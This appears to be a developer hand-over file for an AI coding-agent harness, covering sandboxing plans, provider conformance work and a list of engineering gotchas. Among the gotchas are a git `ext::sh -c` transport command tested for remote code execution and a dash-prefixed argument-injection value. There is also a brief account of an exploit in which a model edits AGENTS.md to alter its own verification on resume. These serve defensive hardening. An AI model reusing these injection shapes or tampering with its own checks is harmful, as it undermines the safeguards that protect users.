| Landlock | §12.6 | medium, **DO FIRST** (now unblocked, highest value) | **The blocker named in this row for several rounds is retired.** It read: "needs either a native helper binary or a vetted raw-syscall binding — neither exists yet, and a hand-rolled one carries a worse failure mode (silently over-permissive, not fail-loud)." That helper now exists and is published: **`@deepseek-ai/node-addon-landlock-run`** (BSD-3-Clause, latest `0.1.1`, verified live on the npm registry) — ~298 lines of C11 over the raw kernel UAPI, statically linked musl, **fail-closed by construction** (exits without running the command if the kernel cannot enforce), self-restrict-then-`exec` so the ruleset is inherited across `execve` while the *invoking* process stays unrestricted, prebuilt for **`linux-x64` and `linux-arm64`**, with `probe() → 'full' \| 'partial' \| 'unusable'` and `grantArgs({readOnly, readWrite})`. **Consume it as a dependency; never vendor it** — see the new `LICENSE_AND_REUSE_ANALYSIS.md §2a` ("Depending on a package is not reusing its source"), which records the verdict and five binding conditions on it. Plan: (1) add the dep, pinned; (2) add a `landlock` rung to `packages/sandbox` behind the existing seam, layered *under* bwrap the way seccomp already is, wired through `detectSandboxBackend()`/`SandboxCapability` and reported by `agent doctor`; (3) **write our own runner-failure classification, status-gated** — a specific exit code **and** a fatal line, with exact informational lines excluded, never a substring bag: this is the whole lesson of their published postmortem 0004, where a bare `'landlock-run: '` substring match made ripgrep's exit-1-for-no-matches surface as `SANDBOX_UNAVAILABLE` on older-ABI kernels that print a *benign* partial-enforcement notice; our own `classifyFailure` has already been bitten twice by exactly this over-broad-text-match shape; (4) real tests on this Linux host in the style of the existing bwrap/seccomp suites — a file outside the allow-list genuinely unreadable, plus an explicit **fail-closed test** (absent/unusable launcher ⇒ no Landlock rung, never an unconfined run). Do **not** copy their `sandbox-local` provider, argv construction, or classification code — sandbox policy code is CLEAN-ROOM-REQUIRED per §3. Full study note: `research/repos/deepseek-harness.md`. |
| `agent workflow` CLI command | §8.1/§18.2, Phase 2 | small — the short-session alternative to Landlock above | Both authoring layers exist now (built-ins + `--workflow-file`, see "what's done") — what's missing is the dedicated list/select/validate command §18.2 itself marks Phase 2. `--workflow-file <path>` can validate-and-run today; there's no `agent workflow validate <path>` that checks a file without starting a run, and no `agent workflow list` enumerating built-ins + any locally-referenced custom ones. Tagged "do first" as the smallest genuinely-unblocked row — a quick win, not the highest-value one. **Updated:** the Landlock row below is **no longer blocked** (a published, fail-closed native helper now exists — see that row) and is tagged "do next (highest value)"; take `agent workflow` first if you want a short session, Landlock first if you want the substantive one. arm64 seccomp remains blocked on a real arm64 host, and the VS Code multi-file view is still deferred pending an engine-version bump. |
| Provider stop/finish-reason conformance — incl. Anthropic `pause_turn` | §4.7/§6.8 | small–medium | **Confirmed real, currently unreachable** (same posture as the old `snapshot-backup.ts` row). `mapStopReason` in `packages/providers/src/anthropic.ts` has no `pause_turn` case, so it falls through `default:` → `"stop"`. Per Anthropic's published API docs, `pause_turn` means the model **paused a long-running turn and the client is expected to resume it** — so the loop would treat a paused turn as a completed one, the exact defect signature round 3 found six instances of. Not reachable today: `pause_turn` only arises when the request declares Anthropic **server** tools (web search / web fetch / code execution) and we declare none (verified by grep — all our tools are client-side). Doing this right is a small **design decision, not a one-liner**: `FinishReason` is `"stop" \| "tool_use" \| "length" \| "error"` with no paused variant, so it needs a new variant plus a decision about what `AgentLoop` does with it (resubmit? treat as a budgeted continuation?). Left queued rather than decided unilaterally. Scope the work as a **table-driven conformance test per adapter** covering the full documented stop/finish vocabulary — `pause_turn`, `aborted`, `content_filter`, `refusal`, `max_tokens`/`length`, `stop_sequence`, `tool_use`/`tool_calls` — with each case's meaning taken from the **provider's own documentation**, using `@earendil-works/pi-ai`'s vocabulary only as a checklist of what to go look up (`research/repos/pi-agent-harness.md`). Adapters stay ours; do not vendor or port pi-ai. |
| ACP (Agent Client Protocol) binding | §18.1/§20/§26 | medium | `PROJECT_SPEC.md` already names ACP three times — §18.1 says our stdio JSON-RPC binding is "deliberately the **same shape as ACP** … so future editor clients are cheap," §20's layer table calls the boundary "ACP-shaped," and §26's risk register commits us to "leaning into those protocols as a client rather than fighting them." We built `@clutchcode/agent-rpc` *shaped like* ACP but never implemented ACP, so no ACP client can actually talk to us. There is now an official **`@agentclientprotocol/sdk`** (`0.25.1`, spec at <https://agentclientprotocol.com>) and a working open-source consumer to study (DeepSeek Harness `packages/acp`, MIT, study-only). Because ACP is an **open protocol**, this is the same verdict as MCP — **REUSE — protocol impl**, not a clean-room problem (`LICENSE_AND_REUSE_ANALYSIS.md §2`). Payoff: Zed/Neovim/Emacs clients for roughly the cost of one adapter over the existing `Agent` boundary, without touching the runtime. Scope it as a *second binding alongside* `agent-rpc`, not a replacement, so the VS Code extension keeps working unchanged. Study note (incl. the working reference consumer): `research/repos/deepseek-harness.md`. |
| Generated model catalog to complement the capability probe | §4.9 | medium | We probe every model at runtime because we do not know its context window/capabilities a priori, falling back to provider defaults per ADR-015 when nothing has been probed. A generated catalog for *known hosted* models, with probing retained for *unknown/local* ones, is strictly better than probing everything — and it is what the §4.5 budgeter actually wants (real numbers, not a default). Idea studied from `@earendil-works/pi-ai`'s `models.generated.ts` + `scripts/generate-models.ts`, including its enforced rule that the generator is the source of truth and the generated file is never hand-edited. Implementation ours; the catalog data should come from each provider's own published model documentation / models endpoint, not from copying theirs. **Not** a reason to adopt pi-ai wholesale — see the "what's done" entry for why its dependency footprint disqualifies it for a local-first tool. Study note: `research/repos/pi-agent-harness.md`. |
| Tool-result pruning as a distinct compaction stage | §4.5 | small–medium | Our context budgeter compacts conversation history wholesale (turn-safe) once the effective-context budget is exceeded, and folds the repo-map/open-file-window share into that same budget. Pruning *tool results* specifically — stale/superseded `shell` output, re-read file windows — is a cheaper, earlier lever we have not built, and it degrades quality far less than dropping whole turns. Idea studied from DeepSeek Harness's `compaction-tool-result-pruner` (a model-free pruner behind its own `ctx.toolResultPruner` seam, kept separate from `compaction-basic`); implementation clean-room, ours, per `docs/PRIOR_ART.md`. Study note: `research/repos/deepseek-harness.md`. |
| arm64 seccomp | §12.6 | small, needs an arm64 host | The x86_64 filter is done and verified; arm64 has a different syscall number table with no way to verify it in this (x86_64) environment — needs either an arm64 host/CI runner or a very high-confidence authoritative source cross-checked the same way libseccomp's resolver was used for x86_64. **Note (new):** this blocker is specific to *seccomp*, whose filter we hand-assemble from architecture-specific syscall numbers. The Landlock row above does **not** inherit it — `@deepseek-ai/node-addon-landlock-run` ships a prebuilt `linux-arm64` binary and carries the ABI burden upstream, so Landlock-on-arm64 arrives free with that work while arm64 *seccomp* stays blocked on a real arm64 host. |
| VS Code multi-file "changes" view | §18.5, minor | small | The extension opens one real `vscode.diff` editor per changed file (done, see "what's done") rather than combining several into VS Code's newer `vscode.changes` command — deliberately skipped since that command isn't universally available across the `^1.85.0` engine range this extension targets. Revisit if the minimum supported VS Code version is ever raised. |
| PageRank repo map | §9, Phase 7 | medium | Tier 0 (ripgrep + on-demand tree-sitter) is what's live; the Aider-style PageRank map is Tier 1, triggered by measured retrieval-accuracy failures on large repos, not built preemptively. |
| Eval scoreboard | §16, Phase 8 | medium–large | The replay harness (§16.3c) is live and gates every phase; the full SWE-bench-Verified-subset + Terminal-Bench-style scoreboard with published methodology is not. |
| Full non-git `AgentLoop` execution path | — | large, separate project | Snapshot-backed (not worktree-backed) execution for non-git directories. `Agent.run` currently refuses cleanly with a "run git init" error instead of attempting this. `SnapshotBackup`'s own traversal gap is already closed (see "what's done"), so this row is now purely "wire the execution path up," not blocked on any open correctness/security gap in the fallback it would use. |
| Multi-agent orchestration | §7, Phase 9 | large | Explicitly out of scope until the §7 rule justifies it — the spec argues *against* building this by default. Don't start it without re-reading §7's reasoning first. |
| Windows sandbox Tier 1 — **revisit trigger only, decision stands** | §12.5/§12.6, A11 | n/a (watch item) | The doc-only/WSL2-recommended decision closed earlier this branch is **not** reopened by this research, and a future session should not treat it as reopened. Recording the evidence honestly so the trigger is legible: DeepSeek Harness ships `sandbox-windows-acl`, a real native Windows rung (a koffi port of a `WRITE_RESTRICTED`-token + restricting-SID mechanism). It **self-reports `enforcement: 'partial'`, not full** — ambient `Everyone` write ACEs and NTFS hard-links leak through, since ACLs bind to file objects rather than paths — and their own design note rejects AppContainer because it "cannot do arbitrary-path reads at all." Both facts **corroborate** §12.5's `[C:Low]` rating of the native path rather than contradicting it, and §29's team-size reasoning is untouched. Revisit only if (a) a Windows contributor/CI host materializes, **and** (b) a native path appears that reports *full*, not partial, enforcement. |

## Known gotchas (read before you hit them again)

- **`import Ajv from "ajv"` type-errors under this repo's `moduleResolution:
  NodeNext`** ("This expression is not constructable" / a `ValidateFunction
  | undefined` not assignable error on `.compile()`'s result). ajv ships a
  single ambiguous `.d.ts` (no separate `.d.cts`/`.d.mts`), and TS's
  NodeNext default-export interop for that shape resolves to the whole
  module namespace, not the class. Fix: `import { Ajv } from "ajv"` — ajv
  also exports the class by name, which sidesteps the broken path
  entirely. Runtime behavior was never actually broken (Node's own CJS
  interop handles the real `.js` file fine) — this is purely a
  compile-time TS quirk, confirmed by testing both import styles against
  the exact same compiled output.
- **`git diff <commit>` (no `--cached`) never reports an untracked path,
  no matter what it's diffed against.** A file the model just wrote that
  was never `git add`ed is invisible to it — not "shown as added," just
  absent. `diffFilesAgainstBase` (§18.5) hit this: fixed by staging first
  (`git add -A`), same as `checkpoint()` already does per step. If a
  diff-based function mysteriously misses a brand-new file, check whether
  it's staged.
- **`git diff --numstat -M` combines a rename's two paths into one
  string** — `"old => new"`, or `"dir/{old => new}"` when they share a
  directory — instead of two separate columns. Any code that tries to
  match a bulk `--numstat` query's output back against individually-
  parsed old/new paths from `--name-status` will never match a rename.
  `diffFilesAgainstBase`'s binary detection hit exactly this (caught in
  code review, see "what's done"): fixed by scoping the numstat query to
  one explicit pathspec per file instead of one bulk query — confirmed
  empirically that scoping to a single path suppresses the combining.
- **`git stash push --include-untracked` silently hides new files.**
  `handleDirtyTree`'s default "stash" strategy will stash an uncommitted
  config change (e.g. a test's `saveConfig()` call) before a run starts,
  so `buildRunDeps`'s `loadConfig` reads the stale default instead of
  what you just wrote. If a test's config change isn't taking effect,
  check whether it was committed before calling `agent.run()`.
- **The Redactor's generic high-entropy pattern (`§5.2`) false-positives
  on innocuous 32+-char uppercase/underscore test strings.** If a
  "leaked content" assertion in a test mysteriously fails even though the
  underlying behavior looks right, check whether your marker string got
  swapped for `«REDACTED:generic»`. Use a lowercase, space-separated
  marker instead.
- **ASK vs. DENY policy decisions**: `write_file`/`edit_file` used to
  collapse every non-ALLOW decision to `"policy-denied"` — harmless while
  WRITE was always ALLOW/DENY, until the submodule gate introduced the
  first WRITE `ASK` case and silently mismapped it. Fixed, but the lesson
  generalizes: when adding a new `ASK` case to an existing policy check,
  verify the caller actually branches on `ASK` vs `DENY`, don't assume it
  does because it handles `DENY`.
- **`pgrep -f '--flag=value'` treats the pattern as a pgrep option.**
  Needs `pgrep -f -- 'flag=value'` (the `--` stops pgrep's own option
  parsing). Bit the throwaway-Secret-Service test helper once.
- **`execFileSync`'s stderr leaks to the parent process by default.**
  Any wrapper around a CLI tool that's *expected* to fail routinely (a
  keychain lookup with nothing stored, no session bus, etc.) needs
  `stdio: ["ignore"|"pipe", "pipe", "ignore"]` explicitly, or its stderr
  text shows up uninvited in every test run and every real agent run.
- **`detectKeychainBackend` reports a backend based on PATH alone, not
  actual reachability.** On this dev container `secret-tool` is always on
  PATH, so the backend is always `"secret-service"` even with no D-Bus
  session running — it just fails at the `keychainGet`/`Set`/`Clear` call
  a layer down. To actually exercise the tier-2 file-store fallback (or
  test "no keychain at all" behavior), you have to force backend `"none"`
  by passing an `env` with a `PATH` that genuinely has no `secret-tool` on
  it — removing `DBUS_SESSION_BUS_ADDRESS` alone isn't enough, it only
  gets you "keychain present but unreachable," a different code path.
- **A raw child-process fd (`bwrap --seccomp FD`) is wired via Node's
  `spawn(..., { stdio: [...] })` array, not any special child_process
  API.** `fs.openSync()` the file, put the resulting fd number at the
  array index matching the fd number you want in the child (index 3 →
  fd 3), and reference that same number in argv (`--seccomp 3`). The
  parent's copy of the fd can be closed immediately after `spawn()`
  returns — the fork+exec already happened synchronously by then, so the
  child has its own independent copy; no need to keep it open for the
  child's whole lifetime.
- **When recalling syscall numbers or any other kernel ABI constant for a
  security-critical filter, don't rely on memory alone if a real
  authoritative source is available.** `libseccomp`'s own resolver
  (`python3 -c "import seccomp; print(seccomp.resolve_syscall(seccomp.Arch(), name))"`,
  needs `apt-get install python3-seccomp` — note it installs against a
  *specific* Python minor version, check `dpkg -L python3-seccomp` if
  `import seccomp` fails on whichever `python3` is first on PATH) settled
  every number in `seccomp-linux.ts` before it got hardcoded, rather than
  trusting recall. Where no authoritative local source exists (arm64,
  here), the honest move is to say so and not implement that path at all
  — see the arm64-seccomp row in "what's left."
- **A cache keyed on a per-run ephemeral path never hits — this bit the
  first pass of `@clutchcode/memory` for real.** `getOrDetectToolchain`
  originally took one `repoRoot` param used for both reading manifest
  files *and* the cache filename; `agent-api` passed it the run's git
  worktree path, which is a fresh temp directory every single run. The
  cache write always "succeeded" and the read logic was all correct in
  isolation — it just never hit anything, because no two runs ever share
  a worktree path. Two `agent.test.ts` assertions caught it immediately
  (`listMemory` came back `undefined`; a "verification is the truth
  oracle" test that expected the run to escalate on a corrupted command
  instead came back `DONE`, because the correction had been written under
  a path nothing would ever read from again). The fix: split the
  parameter into `detectFrom` (the live worktree — what's actually being
  verified) and `cacheKeyPath` (the stable repo+scope identity). Lesson:
  when a cache/memory layer sits underneath something that creates a
  fresh directory per invocation (worktrees, temp dirs, per-run scratch
  space), double-check which path is actually being used as the cache
  *key* versus the *content source* — they're very easy to conflate when
  one function reads from disk and persists to disk in the same call.
- **`git`'s real default for `protocol.ext.allow` is `never`, not the
  general `user` default.** Most unlisted/user-defined protocols default
  to allowed-when-explicitly-invoked (`user`), but `ext::<command>` (and a
  couple of other known-dangerous transports) are special-cased to
  `never` by git itself — confirmed by actually running `git push -u
  "ext::sh -c '...'" main` against a real throwaway repo and getting
  `fatal: transport 'ext' not allowed`, not by trusting a subagent's
  claim. Don't assume a "closes an RCE" security finding about `ext::` is
  accurately scoped without checking git's actual compiled-in default for
  that specific protocol — it's a real risk only on a host where an admin
  has explicitly re-enabled it.
- **A single leading `-` prepended to an LLM/caller-controlled CLI arg
  can become a double-dash long option if the arg itself also starts with
  `-`.** `` `-${arg}` `` with `arg = "output=/tmp/x"` produces `-output=…`
  (harmless — git doesn't recognize single-dash long options), but `arg =
  "-output=/tmp/x"` produces `--output=/tmp/x`, a real long option. Bit
  the `git log` tool's `arg` → `-${arg}` count-shorthand construction for
  real (§ "Full-history security review" in "what's done"). Any code that
  prepends a single fixed dash to a value it doesn't fully control needs
  to validate the value's *shape* (e.g. "must be a bare digit string"),
  not just its absence of malice — a value that's merely "not obviously
  a flag" can still smuggle one in via its own leading dash.
- **`getOrDetectToolchain`'s cache means an AGENTS.md-content change alone
  is invisible to it mid-run — you need a manifest-file change too.**
  `computeManifestHash` only hashes `MANIFEST_FILES` (`package.json`,
  lockfiles, etc.), not `AGENTS.md` itself, so writing a new `AGENTS.md`
  with nothing else changed leaves the cached record's hash matching and
  the cache hit returns the *old* (pre-edit) derived commands unchanged —
  the AGENTS.md override never gets re-applied. This bit reproducing the
  round-3 AGENTS.md trust-boundary exploit directly: a first test version
  that only wrote `AGENTS.md` passed even against the pre-fix code, for
  the wrong reason (cache hit, not the fix). The real trigger needs a
  manifest-file touch alongside the AGENTS.md edit (a `package.json`
  field bump is enough) to force `getOrDetectToolchain` to actually
  re-derive. If a fix "doesn't seem to do anything" in a toolchain-memory-
  adjacent test, check whether the scenario ever invalidates the cache at
  all.
- **A resumed run's `buildRunDeps` runs a second time; a plain `run()`'s
  doesn't, mid-loop.** `toolchainCommands` (and everything else
  `buildRunDeps` derives) is computed once at the top of `run()` and
  reused unchanged for every repair iteration within that same call — a
  model editing something `buildRunDeps` reads (AGENTS.md, config) mid-run
  has no effect on that run's own remaining verification. `resume()` is a
  *separate* top-level call that re-invokes `buildRunDeps` against
  whatever the worktree now contains. Any exploit/bug hypothesis of the
  shape "the model edits X mid-run, does that affect verification this
  run?" needs tracing against this fact before assuming the answer is
  yes — the round-3 AGENTS.md finding's real reachability is specifically
  through `resume()`, not a single uninterrupted `run()` call, despite
  reading at first like the latter.
- **Commander's `.option("--no-<x>", ...)` registered *alone* (no separate
  plain `--<x>` registration) auto-creates a boolean option named `<x>`
  defaulting to `true`.** This is the correct, minimal way to add a
  `--no-squash` counterpart to an existing `--squash`-flavored default:
  replace the old `.option("--squash", ..., true)` registration entirely
  with `.option("--no-squash", ...)` — don't register both, commander
  treats them as the same underlying boolean either way and registering
  both is redundant at best, contradictory at worst.
- **A VS Code `contributes.configuration` property with no explicit
  `"scope"` defaults to `window`-scoped — settable from a workspace's own
  `.vscode/settings.json`.** Any setting whose value gets used as a path,
  command, or URL to execute/fetch needs `"scope": "machine"` (or
  `"application"`) explicitly, or any repo the user opens can silently
  redirect it. No real VS Code extension host exists in this environment
  to prove enforcement end-to-end — the fix (and its test) can only prove
  the schema declaration is correct, not that VS Code honors it; that's
  an honest, stated limit, not a gap to paper over.

## How to resume

1. Read this file, then skim `README.md`'s Status section for anything
   that's landed since this snapshot.
2. `pnpm install && pnpm build && pnpm test` — confirm the baseline is
   still green before changing anything.
3. Pick an item from "What's left" above, or ask the user which they'd
   rather prioritize if it's not obvious from context.
4. Follow `CLAUDE.md`'s testing philosophy: real over mocked wherever
   real is achievable in this environment; when it genuinely isn't
   (another OS, another host), split pure-buildable logic from the
   unverifiable execution boundary and flag the gap explicitly — in a
   header comment and in `README.md`.
5. Full build/test/lint loop before every commit. Update this file's
   "What's done"/"What's left" tables and the snapshot header before
   you stop.
